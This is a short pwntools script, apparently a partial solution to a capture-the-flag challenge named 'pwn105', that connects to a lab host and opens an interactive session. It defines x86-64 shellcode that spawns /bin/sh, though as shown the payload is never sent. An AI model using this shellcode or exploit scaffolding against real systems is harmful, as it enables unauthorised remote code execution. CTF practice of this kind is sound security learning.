from pwn import *

context.binary = binary = "./pwn105.pwn105"
context.log_level = "debug"
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

p = remote("10.10.179.131", 9005)

p.interactive()
